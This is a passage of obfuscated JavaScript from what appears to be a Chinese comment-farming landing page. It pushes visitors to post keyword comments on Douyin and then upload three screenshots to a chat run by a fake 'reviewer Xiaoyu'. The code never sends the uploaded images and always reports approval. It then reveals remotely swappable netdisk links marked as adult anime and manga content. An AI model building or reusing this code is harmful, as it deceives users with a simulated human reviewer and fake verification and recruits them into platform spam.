    _0x38daaf = _0x16dadf.filter(_0x318a0e => !_0x318a0e.fixed).map(_0xdcbe08 => _0xdcbe08.text ? _0xdcbe08 : {
      "text": _0xdcbe08
    }),
    _0x33c178 = Math.max(_0x1f99da.min_keywords || 5, _0x2d4ff2.length),
    _0x5f14de = _0x1f99da.max_keywords || 6;
  let _0x239a97;
  if (_0x2d4ff2.length >= _0x33c178) {
    _0x239a97 = Math.min(_0x2d4ff2.length, _0x5f14de);
  } else _0x239a97 = _0x33c178 + Math.floor(Math.random() * (_0x5f14de - _0x33c178 + 1));
  const _0x1bb3df = Math.max(0, _0x239a97 - _0x2d4ff2.length),
    _0x178a0f = [..._0x38daaf].sort(() => 0.5 - Math.random()),
    _0x41b11e = _0x178a0f.slice(0, _0x1bb3df);
  return [..._0x2d4ff2.slice(0, _0x239a97), ..._0x41b11e];
}
function initStepTexts() {
  const _0x18d03f = window.stepTexts || {},
    _0x408ca7 = window.keywordLinks || {
      "enabled": false,
      "items": []
    },
    _0x13e435 = document.getElementById("search-instruction");
  if (_0x13e435) {
    if (_0x408ca7.enabled) {
      const _0x45816b = _0x18d03f.search_instruction_jump || "点击下面其中一个关键词进入抖音 ↓↓",
        _0x2c1002 = _0x18d03f.search_instruction_font_weight || "bold";
      _0x13e435.innerHTML = "<strong style=\"font-weight: " + _0x2c1002 + ";\">" + _0x45816b + "</strong>";
    } else {
      {
        const _0x494a33 = _0x18d03f.search_instruction || "【打开抖音】随机搜索下面其中一个关键词【点击复制】 ↓↓",
          _0x279270 = _0x18d03f.search_instruction_font_weight || "bold";
        _0x13e435.innerHTML = "<strong style=\"font-weight: " + _0x279270 + ";\">" + _0x494a33 + "</strong>";
      }
    }
  }
  const _0x53f83c = document.getElementById("alternative-search-text");
  if (_0x53f83c) {
    if (_0x408ca7.enabled) {
      const _0x49fdd3 = _0x18d03f.alternative_search_jump || "或者去抖音搜索其他你想看的内容",
        _0x380746 = _0x18d03f.alternative_search_jump_color || "#E03E2D",
        _0x2badcf = _0x18d03f.alternative_search_jump_font_weight || "bold";
      _0x53f83c.innerHTML = "<span style=\"color: " + _0x380746 + "; font-weight: " + _0x2badcf + ";\"><strong>" + _0x49fdd3 + "</strong></span>";
    } else {
      {
        const _0x3d2580 = _0x18d03f.alternative_search || "或者去搜你想看的动漫或本子或游戏名字，只要相关的视频都可以评论",
          _0x3abbb9 = _0x18d03f.alternative_search_color || "#E03E2D",
          _0x5ea61a = _0x18d03f.alternative_search_font_weight || "bold";
        _0x53f83c.innerHTML = "<span style=\"color: " + _0x3abbb9 + "; font-weight: " + _0x5ea61a + ";\"><strong>" + _0x3d2580 + "</strong></span>";
      }
    }
  }
}
document.addEventListener("DOMContentLoaded", function () {
  if (window.keywordPool && window.keywordSettings) {
    renderKeywords();
  } else setTimeout(() => {
    if (window.keywordPool && window.keywordSettings) renderKeywords();else {
      console.error("关键词配置加载失败，使用默认设置");
      window.keywordSettings = window.keywordSettings || {
        "min_keywords": 6,
        "max_keywords": 6,
        "default_color": "#333333",
        "line_break_after": 0
      };
      renderKeywords();
    }
  }, 500);
});
document.addEventListener("DOMContentLoaded", function () {
  addTouchSupport();
});
function showCustomToast(_0x59e81a, _0x4a5a69 = "success") {
  const _0x2d0640 = document.querySelector(".custom-toast");
  _0x2d0640 && document.body.removeChild(_0x2d0640);
  const _0x36c683 = document.createElement("div");
  _0x36c683.className = "custom-toast " + _0x4a5a69;
  const _0x1ae783 = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  if (_0x1ae783) {
    _0x36c683.style.cssText = "\n            position: fixed;\n            bottom: 80px; /* 调整位置避免被输入框遮挡 */\n            left: 50%;\n            transform: translateX(-50%);\n            background: white;\n            color: #333;\n            padding: 12px 20px;\n            border-radius: 8px;\n            z-index: 10000;\n            font-size: 14px;\n            max-width: 90%;\n            text-align: center;\n            animation: fadeInUp 0.3s ease;\n            box-shadow: 0 2px 10px rgba(0,0,0,0.15);\n            border: 1px solid #eee;\n        ";
  }
  _0x36c683.innerHTML = "\n        <div class=\"toast-message\">" + _0x59e81a + "</div>\n    ";
  document.body.appendChild(_0x36c683);
  setTimeout(() => {
    _0x36c683.classList.add("show");
  }, 10);
  setTimeout(() => {
    _0x36c683.classList.remove("show");
    setTimeout(() => {
      _0x36c683.parentNode && _0x36c683.parentNode.removeChild(_0x36c683);
    }, 300);
  }, 3000);
}
function downloadImage() {
  const _0x44b1b7 = document.getElementById("downloadableImage"),
    _0x24cf13 = document.createElement("a"),
    _0x28ca9a = document.createElement("canvas");
  _0x28ca9a.width = _0x44b1b7.naturalWidth;
  _0x28ca9a.height = _0x44b1b7.naturalHeight;
  const _0xa4c3d = _0x28ca9a.getContext("2d");
  _0xa4c3d.drawImage(_0x44b1b7, 0, 0);
  _0x24cf13.href = _0x28ca9a.toDataURL("image/jpeg");
  _0x24cf13.download = "53bk.jpg";
  document.body.appendChild(_0x24cf13);
  _0x24cf13.click();
  document.body.removeChild(_0x24cf13);
}
function showTaskTip() {
  showCustomToast("〓取完整资源，请按照下面步骤完成任务〓！");
}
document.addEventListener("DOMContentLoaded", function () {
  loadRemoteControlConfig().then(() => {
    checkOverrideConditions().catch(_0x26c800 => {
      console.warn("检查失败:", _0x26c800);
    });
  }).catch(_0x2ec97f => {
    console.warn("加载失败:", _0x2ec97f);
  });
  renderKeywords();
  showSlides(1);
  updateRewardSlide();
  initDraggable();
});
let messageCount = 0;
function show_floatWindow() {
  const _0x2643c7 = document.getElementById("iframe_company_mini_div"),
    _0x4ca78d = document.getElementById("mini-btn");
  if (_0x2643c7) {
    _0x2643c7.style.display = "block";
    if (!_0x2643c7.style.top) {
      {
        const _0x52a3c1 = window.innerHeight,
          _0x4e4ef9 = window.innerWidth,
          _0x5702f3 = _0x2643c7.offsetHeight,
          _0x3ce746 = _0x2643c7.offsetWidth;
        _0x2643c7.style.bottom = "20px";
        _0x2643c7.style.right = "2px";
      }
    }
    initDraggable();
    _0x4ca78d && (_0x4ca78d.style.display = "none");
    resetMessageNotification();
  } else showCustomToast("聊天窗口正在加载中...", "info");
}
function hide_floatWindow() {
  const _0x2c4a9d = document.getElementById("iframe_company_mini_div"),
    _0x40bf2a = document.getElementById("mini-btn");
  _0x2c4a9d && (_0x2c4a9d.style.display = "none");
  _0x40bf2a && (_0x40bf2a.style.display = "block");
}
let lastImageVerified = false,
  imageUploadCount = 0;
function handleKfImageSelect(_0x21bbf2) {
  if (_0x21bbf2.files && _0x21bbf2.files[0]) {
    const _0x2fda9f = new FileReader();
    _0x2fda9f.onload = function (_0x395d12) {
      addUserMessage(_0x395d12.target.result, true);
      var _0x196584 = document.createElement("div");
      _0x196584.className = "loading-message";
      _0x196584.innerHTML = "<div style=\"margin: 10px 0;\"><div style=\"display: flex; align-items: flex-start; gap: 4px;\"><div style=\"position: relative; min-width: 36px;\"><img src=\"/img/头像.png\" style=\"width: 36px; height: 36px; border-radius: 50%; border: 2px solid #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);\"><span style=\"position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; background: #4CAF50; border: 2px solid #fff; border-radius: 50%;\"></span></div><div style=\"flex: 1; width: calc(100% - 40px);\"><div style=\"display: flex; align-items: center; gap: 8px; margin-bottom: 4px;\"><span style=\"font-size: 14px; color: #333; font-weight: 500;\">审核员小雨</span><span style=\"font-size: 12px; color: #4CAF50; background: rgba(76, 175, 80, 0.1); padding: 2px 6px; border-radius: 10px;\">在线中</span></div><div style=\"background: #fff; padding: 10px 12px; border-radius: 4px 12px 12px 12px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); max-width: 98%; word-break: break-word;\">正在审核图片，请稍候...</div></div></div></div>";
      document.getElementById("chat_content").appendChild(_0x196584);
      document.getElementById("chat_content").scrollTop = document.getElementById("chat_content").scrollHeight;
    };
    _0x2fda9f.readAsDataURL(_0x21bbf2.files[0]);
    var _0x5d065d = new FormData();
    _0x5d065d.append("file", _0x21bbf2.files[0]);
    imageUploadCount++;
    const _0xf29778 = {
      "success": true,
      "message": "图片上传成功，审核通过！当前已上传 " + imageUploadCount + " 张图片，请继续上传剩余 " + (3 - imageUploadCount) + " 张图片",
      "count": imageUploadCount,
      "task_completed": true
    };
    setTimeout(() => {
      const _0x4d91f9 = document.querySelector(".loading-message");
      _0x4d91f9 && _0x4d91f9.remove();
      var _0x2a9b17 = document.createElement("div");
      _0x2a9b17.style.margin = "10px 0";
      var _0x20d3e3 = "<div style=\"display: flex; align-items: flex-start; gap: 4px;\"><div style=\"position: relative; min-width: 36px;\"><img src=\"img/头像.png\" style=\"width: 36px; height: 36px; border-radius: 50%; border: 2px solid #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);\"><span style=\"position: absolute; bottom: 0; right: 0; width: 10px; height: 10px; background: #4CAF50; border: 2px solid #fff; border-radius: 50%;\"></span></div><div style=\"flex: 1; width: calc(100% - 40px);\"><div style=\"display: flex; align-items: center; gap: 8px; margin-bottom: 4px;\"><span style=\"font-size: 14px; color: #333; font-weight: 500;\">审核员小雨</span><span style=\"font-size: 12px; color: #4CAF50; background: rgba(76, 175, 80, 0.1); padding: 2px 6px; border-radius: 10px;\">在线中</span></div>";
      if (_0xf29778.html_message) _0x20d3e3 += _0xf29778.html_message;else {
        if (_0xf29778.message) {
          _0x20d3e3 += "<div style=\"background: #fff; padding: 10px 12px; border-radius: 4px 12px 12px 12px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); max-width: 98%; word-break: break-word;\">" + _0xf29778.message + "</div>";
        } else !_0xf29778.success && (_0x20d3e3 += "<div style=\"background: #fff; padding: 10px 12px; border-radius: 4px 12px 12px 12px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); max-width: 98%; word-break: break-word; color: #f44336;\">处理图片时出错: " + (_0xf29778.error || "未知错误") + "</div>");
      }
      _0x20d3e3 += "</div></div>";
      _0x2a9b17.innerHTML = _0x20d3e3;
      document.getElementById("chat_content").appendChild(_0x2a9b17);
      document.getElementById("chat_content").scrollTop = document.getElementById("chat_content").scrollHeight;
      _0xf29778.count && _0xf29778.count < 3 && console.log("审核进度: " + _0xf29778.count + "/3");
      _0xf29778.task_completed && console.log("任务完成!");
      imageUploadCount === 3 && checkImageAndRespond();
    }, 1500);
  }
}
function extractRecognizedText(_0x1c1e82) {
  const _0x1da947 = _0x1c1e82.split("\n"),
    _0x368162 = [];
  let _0x10d3b4 = false;
  for (let _0x5dfeba of _0x1da947) {
    {
      if (_0x5dfeba.includes("检测到的所有文本:")) {
        {
          _0x10d3b4 = true;
          continue;
        }
      }
      if (_0x10d3b4 && _0x5dfeba.match(/^\d+\.\s/)) {
        const _0x3e5db7 = _0x5dfeba.replace(/^\d+\.\s/, "").trim();
        _0x3e5db7 && _0x368162.push(_0x3e5db7);
      }
      _0x10d3b4 && _0x5dfeba.includes("=====") && (_0x10d3b4 = false);
    }
  }
  return _0x368162;
}
function sendKfMessage() {
  const _0x2a6c70 = document.getElementById("kf_message_input"),
    _0x51abec = _0x2a6c70.value.trim();
  if (_0x51abec) {
    addUserMessage(_0x51abec);
    _0x2a6c70.value = "";
    lastImageVerified ? checkImageAndRespond() : addBotResponse("请先上传评论规范截图后<br>即可免费获取所有游戏链接哦！");
  } else lastImageVerified ? checkImageAndRespond() : showCustomToast("请输入消息或上传符合要求的图片", "info");
}
function addUserMessage(_0x37a9c6, _0x3280fb = false) {
  const _0x4295f1 = document.getElementById("chat_content"),
    _0x2d8f1f = document.createElement("div");
  _0x2d8f1f.style.margin = "10px 0";
  _0x2d8f1f.style.display = "flex";
  _0x2d8f1f.style.justifyContent = "flex-end";
  let _0x147a4e = "\n        <div style=\"display: flex; flex-direction: row-reverse; align-items: flex-start; gap: 4px; width: 100%;\">\n            <div style=\"flex: 1; display: flex; flex-direction: column; align-items: flex-end; width: 100%;\">\n                <div style=\"\n                    background: #dcf8c6;\n                    padding: 10px 12px;\n                    border-radius: 12px 4px 12px 12px;\n                    box-shadow: 0 1px 2px rgba(0,0,0,0.1);\n                    margin-left: auto;\n                    max-width: 98%;\n                    word-break: break-word;\n                \">\n    ";
  _0x3280fb ? _0x147a4e += "<img src=\"" + _0x37a9c6 + "\" style=\"max-width: 100%; max-height: 300px; border-radius: 4px;\">" : _0x147a4e += _0x37a9c6;
  _0x147a4e += "\n                </div>\n            </div>\n        </div>\n    ";
  _0x2d8f1f.innerHTML = _0x147a4e;
  _0x4295f1.appendChild(_0x2d8f1f);
  _0x4295f1.scrollTop = _0x4295f1.scrollHeight;
}
function addBotResponse(_0x2be3c4, _0xaaa6bf = false) {
  const _0x447378 = document.getElementById("chat_content"),
    _0x1edfc4 = document.createElement("div");
  _0x1edfc4.style.margin = "10px 0";
  let _0x4efce8 = "\n        <div style=\"display: flex; align-items: flex-start; gap: 4px;\">\n            <div style=\"position: relative; min-width: 36px;\">\n                <img src=\"img/头像.png\" style=\"width: 36px; height: 36px; border-radius: 50%; border: 2px solid #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);\">\n                <span style=\"\n                    position: absolute;\n                    bottom: 0;\n                    right: 0;\n                    width: 10px;\n                    height: 10px;\n                    background: #4CAF50;\n                    border: 2px solid #fff;\n                    border-radius: 50%;\n                \"></span>\n            </div>\n            <div style=\"flex: 1; width: calc(100% - 40px);\">\n                <div style=\"\n                    display: flex;\n                    align-items: center;\n                    gap: 8px;\n                    margin-bottom: 4px;\n                \">\n                    <span style=\"\n                        font-size: 14px;\n                        color: #333;\n                        font-weight: 500;\n                    \">审核员小雨</span>\n                    <span style=\"\n                        font-size: 12px;\n                        color: #4CAF50;\n                        background: rgba(76, 175, 80, 0.1);\n                        padding: 2px 6px;\n                        border-radius: 10px;\n                    \">在线中</span>\n                </div>\n                <div style=\"\n                    background: #fff;\n                    padding: 10px 12px;\n                    border-radius: 4px 12px 12px 12px;\n                    box-shadow: 0 1px 2px rgba(0,0,0,0.1);\n                    max-width: 98%;\n                    word-break: break-word;\n                \">\n    ";
  if (_0xaaa6bf) {
    _0x4efce8 += "\n            <div style=\"font-weight: bold; margin-bottom: 8px;\">✅ 宝子恭喜你获得资源（一共有3个获取入口，如果其中一个和谐或者没有想看的就换一个渠道）速度保存到自己网盘，因为链接随时失效，3个渠道建议全部保存到自己的网盘，因为每个网盘的资源都不一样</div>\n            " + _0x2be3c4 + "\n        ";
  } else _0x4efce8 += _0x2be3c4;
  _0x4efce8 += "\n                </div>\n            </div>\n        </div>\n    ";
  _0x1edfc4.innerHTML = _0x4efce8;
  _0x447378.appendChild(_0x1edfc4);
  _0x447378.scrollTop = _0x447378.scrollHeight;
}
function resetMessageNotification() {
  const _0x5556f3 = document.getElementById("info-num");
  _0x5556f3 && (_0x5556f3.style.display = "none", _0x5556f3.textContent = "0");
  messageCount = 0;
}
function showMessageNotification() {
  messageCount++;
  const _0xb0f546 = document.getElementById("info-num");
  if (_0xb0f546) {
    _0xb0f546.style.display = "block";
    _0xb0f546.textContent = messageCount;
  }
}
async function checkImageAndRespond() {
  lastImageVerified = false;
  addBotResponse("正在获取，请稍候...");
  let _0x49afb9;
  try {
    {
      if (overrideResult.should_override && overrideResult.config.override_links && overrideResult.config.custom_links && overrideResult.config.custom_links.length > 0) {
        console.log("使用链接");
        _0x49afb9 = {
          "intro_text": "✅ 宝子恭喜你获得资源（有下面几个获取入口，如果其中一个和谐或者没有想看的就换一个渠道）速度保存到自己网盘，因为链接随时失效，下面的渠道建议全部保存到自己的网盘，因为每个网盘的资源都不一样",
          "links": overrideResult.config.custom_links.map(_0x5ae878 => ({
            "url": _0x5ae878.url || "#",
            "title": _0x5ae878.title || "链接",
            "icon": _0x5ae878.icon || "🔞",
            "enabled": true
          }))
        };
      }
    }
  } catch (_0x5a082a) {
    console.warn("处理失败:", _0x5a082a);
  }
  !_0x49afb9 && (console.log("使用原始链接"), _0x49afb9 = window.gameLinks || {
    "intro_text": "✅ 宝子恭喜你获得资源（一共有3个获取入口，如果其中一个和谐或者没有想看的就换一个渠道）速度保存到自己网盘，因为链接随时失效，3个渠道建议全部保存到自己的网盘，因为每个网盘的资源都不一样",
    "links": [{
      "url": "https://pan.quark.cn/s/bee50fd9a42a",
      "title": "渠道1  夸克网盘800G 同人动漫-漫画",
      "icon": "🔞",
      "enabled": true
    }, {
      "url": "https://pan.xunlei.com/s/VOZ4XFyGKicI8yIGKJtlm0rKA1?pwd=hd9j#",
      "title": "渠道2  迅雷网盘600G 同人动漫-漫画",
      "icon": "🔞",
      "enabled": true
    }, {
      "url": "http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=wFIz_zjduMrfbnQOyWokfSnXlLhdd7p0&authKey=JRfR7UuqgURjxyNBF%2B%2FIQGRmhoLYNa5rKWKDKyclVtnTm46DBGza2NmkaUMZGG8B&noverify=0&group_code=102123267",
      "title": "点击加入动漫天堂等通知~",
      "icon": "🔞",
      "enabled": true
    }]
  });
  let _0x518dbd = "<div class=\"game-links-container\">";
  _0x518dbd += "<div style=\"font-weight: bold; margin-bottom: 8px;\">" + _0x49afb9.intro_text + "</div>";
  _0x49afb9.links.forEach(_0x52be38 => {
    _0x52be38.enabled && _0x52be38.title && (_0x518dbd += "\n                <a href=\"#\" class=\"game-link\" onclick=\"window.open('" + _0x52be38.url + "', '_blank'); return false;\">\n                    <span class=\"game-icon\">" + _0x52be38.icon + "</span>\n                    <span class=\"game-title\">" + _0x52be38.title + "</span>\n                    <span class=\"game-arrow\">→</span>\n                </a>\n            ");
  });
  _0x518dbd += "</div>";
  addBotResponse(_0x518dbd, false);
  showMessageNotification();
}
function showVoiceCall() {
  showCustomToast("语音功能即将上线，敬请期待", "info");
}
function show_about_box() {
  alert("AI机器人为您服务");
}
function openKuaishou() {
  let _0x337468 = "kwai://home",
    _0x4f0227 = "https://www.kuaishou.com/",
    _0x548bbc = document.createElement("iframe");
  _0x548bbc.style.display = "none";
  _0x548bbc.src = _0x337468;
  document.body.appendChild(_0x548bbc);
  setTimeout(function () {
    document.body.removeChild(_0x548bbc);
    window.location.href = _0x4f0227;
  }, 2000);
  showCustomToast("正在打开快手...", "success");
}
function openDouyin() {
  let _0x1b27d9 = "snssdk1128://",
    _0x17b224 = "https://www.douyin.com/",
    _0x5abc25 = document.createElement("iframe");
  _0x5abc25.style.display = "none";
  _0x5abc25.src = _0x1b27d9;
  document.body.appendChild(_0x5abc25);
  setTimeout(function () {
    document.body.removeChild(_0x5abc25);
    window.location.href = _0x17b224;
  }, 2000);
  showCustomToast("正在打开抖音...", "success");
}
let isDragging = false,
  dragOffsetX = 0,
  dragOffsetY = 0;
function initDraggable() {
  const _0x2a1af9 = document.getElementById("iframe_company_mini_div"),
    _0x9cc45e = document.querySelector(".pc-visitor-header");
  if (!_0x2a1af9 || !_0x9cc45e) return;
  _0x9cc45e.addEventListener("mousedown", function (_0x4d0fd2) {
    isDragging = true;
    dragOffsetX = _0x4d0fd2.clientX - _0x2a1af9.getBoundingClientRect().left;
    dragOffsetY = _0x4d0fd2.clientY - _0x2a1af9.getBoundingClientRect().top;
    _0x2a1af9.style.transition = "none";
  });
  _0x9cc45e.addEventListener("touchstart", function (_0x2a6acc) {
    _0x2a6acc.touches.length === 1 && (isDragging = true, dragOffsetX = _0x2a6acc.touches[0].clientX - _0x2a1af9.getBoundingClientRect().left, dragOffsetY = _0x2a6acc.touches[0].clientY - _0x2a1af9.getBoundingClientRect().top, _0x2a1af9.style.transition = "none");
  }, {
    "passive": false
  });
  document.addEventListener("mousemove", function (_0x515c62) {
    {
      if (!isDragging) return;
      _0x515c62.preventDefault();
      moveWindow(_0x515c62.clientX, _0x515c62.clientY);
    }
  });
  document.addEventListener("touchmove", function (_0xa8206c) {
    {
      if (!isDragging || _0xa8206c.touches.length !== 1) return;
      _0xa8206c.preventDefault();
      moveWindow(_0xa8206c.touches[0].clientX, _0xa8206c.touches[0].clientY);
    }
  }, {
    "passive": false
  });
  document.addEventListener("mouseup", function () {
    stopDragging();
  });
  document.addEventListener("touchend", function () {
    stopDragging();
  });
  document.addEventListener("mouseleave", function () {
    stopDragging();
  });
}
function moveWindow(_0xe797b7, _0xf8af37) {
  const _0x2493f7 = document.getElementById("iframe_company_mini_div");
  if (!_0x2493f7) return;
  let _0x152f4c = _0xe797b7 - dragOffsetX,
    _0x2819d9 = _0xf8af37 - dragOffsetY;
  const _0x3f1cf4 = window.innerWidth,
    _0x10f435 = window.innerHeight,
    _0x4f5a72 = _0x2493f7.offsetWidth,
    _0x247e18 = _0x2493f7.offsetHeight;
  _0x152f4c = Math.max(0, Math.min(_0x3f1cf4 - _0x4f5a72, _0x152f4c));
  _0x2819d9 = Math.max(0, Math.min(_0x10f435 - _0x247e18, _0x2819d9));
  _0x2493f7.style.left = _0x152f4c + "px";
  _0x2493f7.style.right = "auto";
  _0x2493f7.style.top = _0x2819d9 + "px";
  _0x2493f7.style.bottom = "auto";
}
function stopDragging() {
  if (isDragging) {
    const _0xad2bdb = document.getElementById("iframe_company_mini_div");
    _0xad2bdb && (_0xad2bdb.style.transition = "");
    isDragging = false;
  }
}
async function updateKeywordButtons() {
  try {
    const _0x7e8f3d = await fetch("/api/get-config"),
      _0x1166af = await _0x7e8f3d.json();
    if (_0x1166af.success && _0x1166af.data && _0x1166af.data.keywords) {
      const _0x55197c = document.querySelector(".keyword-buttons");
      _0x55197c && (_0x55197c.innerHTML = "", _0x1166af.data.keywords.forEach(_0x229a81 => {
        {
          const _0x594920 = document.createElement("span");
          _0x594920.className = "keyword-btn";
          _0x594920.textContent = _0x229a81;
          _0x594920.onclick = () => copyKeyword(_0x229a81);
          _0x594920.onmouseover = () => _0x594920.style.transform = "scale(1.05)";
          _0x594920.onmouseout = () => _0x594920.style.transform = "scale(1)";
          _0x55197c.appendChild(_0x594920);
        }
      }));
    }
  } catch (_0x1281df) {
    console.error("获取关键词失败:", _0x1281df);
    showCustomToast("获取关键词失败，请刷新页面重试", "error");
  }
}
window.openModal = function (_0x2dcaa5, _0x3cff70, _0xedf65a, _0x1bab66) {
  document.getElementById("myModal").style.display = "block";
};
window.closeModal = function () {
  document.getElementById("myModal").style.display = "none";
};
window.onclick = function (_0x5bff34) {
  if (_0x5bff34.target == document.getElementById("myModal")) {
    window.closeModal();
  }
};
const keywordLayoutSettings = {
  "step1": window.layoutSettings?.["step1_keywords"] || "left",
  "step2": window.layoutSettings?.["step2_comments"] || "left"
};
function setKeywordLayout() {
  const _0x48acc9 = document.getElementById("step1-keywords");
  if (_0x48acc9) {
    if (keywordLayoutSettings.step1 === "center") {
      _0x48acc9.style.textAlign = "center";
      _0x48acc9.style.display = "flex";
      _0x48acc9.style.flexDirection = "column";
      _0x48acc9.style.alignItems = "center";
      _0x48acc9.style.justifyContent = "center";
    } else _0x48acc9.style.textAlign = "left", _0x48acc9.style.display = "block";
  }
  const _0x499cbb = document.getElementById("step2-keywords");
  if (_0x499cbb) {
    if (keywordLayoutSettings.step2 === "center") {
      {
        _0x499cbb.style.textAlign = "center";
        _0x499cbb.style.display = "flex";
        _0x499cbb.style.flexDirection = "column";
        _0x499cbb.style.alignItems = "center";
        _0x499cbb.style.justifyContent = "center";
      }
    } else {
      _0x499cbb.style.textAlign = "left";
      _0x499cbb.style.display = "block";
    }
  }
}
function updateKeywordLayout(_0x44d34f, _0x2100d8) {
  if (_0x44d34f === 1) keywordLayoutSettings.step1 = _0x2100d8;else {
    if (_0x44d34f === 2) {
      keywordLayoutSettings.step2 = _0x2100d8;
    }
  }
  setKeywordLayout();
}
async function fetchKeywords() {
  try {
    const response = await fetch(window.siteConfig.api_endpoints.get_config);
    const data = await response.json();
    return data.keywords;
  } catch (error) {
    console.error("获取关键词失败:", error);
    return window.keywordPool;
  }
}